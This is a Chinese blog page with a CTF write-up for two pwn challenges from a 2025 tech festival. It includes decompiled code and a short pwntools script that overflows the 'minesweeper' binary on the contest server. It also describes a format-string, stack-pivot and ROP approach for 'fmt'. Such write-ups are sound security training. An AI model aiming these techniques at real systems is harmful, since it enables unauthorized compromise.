

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/cat.jpg">
  <link rel="icon" href="/img/cat.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="briteny-pwn">
  <meta name="keywords" content="">
  
    <meta name="description" content="解题WP">
<meta property="og:type" content="article">
<meta property="og:title" content="科技文化节">
<meta property="og:url" content="http://example.com/%E7%A7%91%E6%8A%80%E6%96%87%E5%8C%96%E8%8A%82/index.html">
<meta property="og:site_name" content="Briteny&#39;s Blog">
<meta property="og:description" content="解题WP">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-04-28T03:49:00.000Z">
<meta property="article:modified_time" content="2025-05-27T06:59:51.933Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>科技文化节 - Briteny&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":100,"cursorChar":".","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>briteny-pwn&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="科技文化节"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-04-28 11:49" pubdate>
          2025年4月28日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          3.9k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          33 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">科技文化节</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="2025科技文化节"><a href="#2025科技文化节" class="headerlink" title="2025科技文化节"></a>2025科技文化节</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="minesweeper"><a href="#minesweeper" class="headerlink" title="minesweeper"></a>minesweeper</h3><h4 id="checksec："><a href="#checksec：" class="headerlink" title="checksec："></a>checksec：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/cmp_1$ checksec sweeper<br>[*] &#x27;/mnt/d/copy/cmp_1/sweeper&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure>



<h4 id="IDA-Pro："><a href="#IDA-Pro：" class="headerlink" title="IDA_Pro："></a>IDA_Pro：</h4><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init();<br>  <span class="hljs-keyword">while</span> ( dword_5010 != <span class="hljs-number">1</span> &amp;&amp; dword_5010 != <span class="hljs-number">2</span> &amp;&amp; dword_5010 != <span class="hljs-number">3</span> &amp;&amp; dword_5010 != <span class="hljs-number">4</span> )<br>  &#123;<br>    menu();<br>    __isoc99_scanf(&amp;unk_3157, &amp;dword_5010);<br>    <span class="hljs-keyword">switch</span> ( dword_5010 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">puts</span>(asc_3278);<br>        <span class="hljs-built_in">puts</span>(asc_329A);<br>        myexit();<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">puts</span>(asc_32B8);<br>        <span class="hljs-built_in">puts</span>(asc_329A);<br>        myexit();<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        m = <span class="hljs-number">30</span>;<br>        n = <span class="hljs-number">16</span>;<br>        l = <span class="hljs-number">99</span>;<br>        game();<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">puts</span>(aE_0);<br>        myexit();<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        hint();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(asc_32F0);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>case1,case2  并没有什么用处</strong></p>
<p><strong>case3 从逻辑上看是进行游戏，case4 也没什么用处貌似case5 就是讲解示范例子</strong></p>
<p><strong>其他情况就是输入有误</strong></p>
<p>所以问题应该出现在case3：</p>
<h5 id="game："><a href="#game：" class="headerlink" title="game："></a>game：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">m = <span class="hljs-number">30</span>;<br>n = <span class="hljs-number">16</span>;<br>l = <span class="hljs-number">99</span>;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">game</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// [rsp+8h] [rbp-8h] BYREF</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(aE);<br>  sl = l;<br>  game_init();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d X %d , %d 棰楅浄\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)m, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)n, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)l);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    mapping();<span class="hljs-comment">//貌似是一个打印扫雷地图的过程</span><br>    v1 = <span class="hljs-number">100</span>;<br>    v0 = <span class="hljs-number">100</span>;<br>    myread(&amp;v1, &amp;v0);<br>    dword_5010 = <span class="hljs-number">0</span>;<br>    choice();<br>    <span class="hljs-keyword">switch</span> ( dword_5010 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        explore(&amp;v1, &amp;v0);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        mine(&amp;v1, &amp;v0);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        mark(&amp;v1, &amp;v0);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="myread"><a href="#myread" class="headerlink" title="myread:"></a>myread:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">myread</span><span class="hljs-params">(<span class="hljs-type">int</span> *a1, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *a2)</span><span class="hljs-comment">//a1 = 100 ,a2 = 100[ 为无符号数 ] ，n = 16 ，m = 30</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">while</span> ( *a1 &gt; n || *a1 &lt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(asc_3138);<br>    __isoc99_scanf(&amp;unk_3157, a1);<span class="hljs-comment">//接受一个值为为100</span><br>    <span class="hljs-keyword">if</span> ( *a1 &gt; n || *a1 &lt;= <span class="hljs-number">0</span> )<span class="hljs-comment">//如果大于16或小于0，则输出错误信息，代表输入的行信息</span><br>      <span class="hljs-built_in">puts</span>(asc_315A);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)*a2 &lt;= m )<span class="hljs-comment">//检测用户输入的数是否小于30，代表输入的列信息</span><br>    &#123;<br>      result = *a2;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)result &gt; <span class="hljs-number">0</span> )<span class="hljs-comment">//返回值最后就是列值</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(asc_3170);<span class="hljs-comment">//如果不满足则输出错误，并重新进行输入</span><br>    __isoc99_scanf(&amp;unk_3157, a2);<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)*a2 &gt; m || (<span class="hljs-type">int</span>)*a2 &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">puts</span>(asc_315A);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="choice："><a href="#choice：" class="headerlink" title="choice："></a>choice：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">choice</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    result = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_5010;<br>    <span class="hljs-keyword">if</span> ( dword_5010 == <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    result = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_5010;<br>    <span class="hljs-keyword">if</span> ( dword_5010 == <span class="hljs-number">2</span> )<br>      <span class="hljs-keyword">break</span>;<br>    result = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_5010;<br>    <span class="hljs-keyword">if</span> ( dword_5010 == <span class="hljs-number">3</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">printf</span>(asc_31C8);<br>    dword_5010 = read_int();<br>    <span class="hljs-keyword">if</span> ( dword_5010 != <span class="hljs-number">1</span> &amp;&amp; dword_5010 != <span class="hljs-number">2</span> &amp;&amp; dword_5010 != <span class="hljs-number">3</span> )<br>      <span class="hljs-built_in">puts</span>(asc_315A);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>接受输入为选择序号，不在列表范围内即排除</strong></p>
<p><strong>随后退出函数后进行相关操作</strong></p>
<p><strong>最开始看我觉得这个read_int 中的 unsigned_int可能有点说法,而且看到了它是一个手写的函数我觉得比较不对劲</strong></p>
<h5 id="read-int"><a href="#read-int" class="headerlink" title="read_int"></a><strong>read_int</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">read_int</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> buf; <span class="hljs-comment">// [rsp+Ch] [rbp-4h] BYREF</span><br><br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x10u</span>LL);<br>  <span class="hljs-keyword">return</span> buf;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>通常的无符号整型是4个字节，所以这个部分根本没有溢出</strong></p>
<p>但是随后又发现这个很不对劲啊，rbp-0x04吗？</p>
<p>随后开始构造</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context (os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27; , log_level=&#x27;debug&#x27;)<br><br>#p = process(&#x27;./sweeper&#x27;)<br>p = remote(&#x27;210.30.97.133&#x27;,10139)<br><br>p.sendline(&#x27;3&#x27;)<br>p.sendline(&#x27;3&#x27;)<br>p.sendline(&#x27;3&#x27;)<br>payload1 = b&#x27;a&#x27;*12 + b&#x27;\x46&#x27;<br>p.send(payload1)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>





<h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/cmp_2$ checksec fmt<br>[*] &#x27;/mnt/d/copy/cmp_2/fmt&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure>



<h4 id="IDA-Pro"><a href="#IDA-Pro" class="headerlink" title="IDA_Pro:"></a>IDA_Pro:</h4><h5 id="main-1"><a href="#main-1" class="headerlink" title="main:"></a>main:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you have one chance .&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100u</span>LL);<br>  func1(&amp;buf);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss:00000000004040A0 buf             db    ? ;  <br></code></pre></td></tr></table></figure>

<h5 id="func1"><a href="#func1" class="headerlink" title="func1:"></a>func1:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">func1</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> func2(a1);<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="func2"><a href="#func2" class="headerlink" title="func2:"></a>func2:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">func2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br><br>  result = flag;<br>  <span class="hljs-keyword">if</span> ( flag == <span class="hljs-number">1</span> )<br>  &#123;<br>    result = <span class="hljs-built_in">printf</span>(a1);<br>    flag = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>可以明显地看到，func2中存在明显的格式化字符串漏洞</strong></p>
<p><strong>然后func1连续调用func2，并且存在格式化字符串漏洞，有栈转移的风险</strong></p>
<h4 id="assembly"><a href="#assembly" class="headerlink" title="assembly"></a>assembly</h4><h5 id="func1-1"><a href="#func1-1" class="headerlink" title="func1:"></a>func1:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000000401196 ; int __fastcall func1(const char *)<br>.text:0000000000401196                 public func1<br>.text:0000000000401196 func1           proc near               ; CODE XREF: main+87↓p<br>.text:0000000000401196<br>.text:0000000000401196 var_8           = qword ptr -8<br>.text:0000000000401196<br>.text:0000000000401196 ; __unwind &#123;<br>.text:0000000000401196                 endbr64<br>.text:000000000040119A                 push    rbp<br>.text:000000000040119B                 mov     rbp, rsp<br>.text:000000000040119E                 sub     rsp, 10h<br>.text:00000000004011A2                 mov     [rbp+var_8], rdi<br>.text:00000000004011A6                 mov     rax, [rbp+var_8]<br>.text:00000000004011AA                 mov     rdi, rax<br>.text:00000000004011AD                 mov     eax, 0<br>.text:00000000004011B2                 call    func2<br>.text:00000000004011B7                 nop<br>.text:00000000004011B8                 leave 														&lt;----<br>.text:00000000004011B9                 retn															&lt;----<br>.text:00000000004011B9 ; &#125; // starts at 401196<br>.text:00000000004011B9 func1           endp<br></code></pre></td></tr></table></figure>

<h5 id="func2-1"><a href="#func2-1" class="headerlink" title="func2:"></a>func2:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00000000004011BA ; int __fastcall func2(const char *)<br>.text:00000000004011BA                 public func2<br>.text:00000000004011BA func2           proc near               ; CODE XREF: func1+1C↑p<br>.text:00000000004011BA<br>.text:00000000004011BA format          = qword ptr -8<br>.text:00000000004011BA<br>.text:00000000004011BA ; __unwind &#123;<br>.text:00000000004011BA                 endbr64<br>.text:00000000004011BE                 push    rbp<br>.text:00000000004011BF                 mov     rbp, rsp<br>.text:00000000004011C2                 sub     rsp, 10h<br>.text:00000000004011C6                 mov     [rbp+format], rdi<br>.text:00000000004011CA                 mov     eax, cs:flag<br>.text:00000000004011D0                 cmp     eax, 1<br>.text:00000000004011D3                 jnz     short loc_4011F0<br>.text:00000000004011D5                 mov     rax, [rbp+format]<br>.text:00000000004011D9                 mov     rdi, rax        ; format<br>.text:00000000004011DC                 mov     eax, 0<br>.text:00000000004011E1                 call    _printf<br>.text:00000000004011E6                 mov     cs:flag, 0<br>.text:00000000004011F0<br>.text:00000000004011F0 loc_4011F0:                             ; CODE XREF: func2+19↑j<br>.text:00000000004011F0                 nop<br>.text:00000000004011F1                 leave<br>.text:00000000004011F2                 retn<br>.text:00000000004011F2 ; &#125; // starts at 4011BA<br>.text:00000000004011F2 func2           endp<br></code></pre></td></tr></table></figure>

<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h4><p><strong>构造格式化字符串漏洞，改写RBP指向的地址的内容，然后即可完成栈迁移，观察函数运行时rdi的残留值并输出，随后根据输出计算libc_base，再构造出syscall的rop链</strong></p>
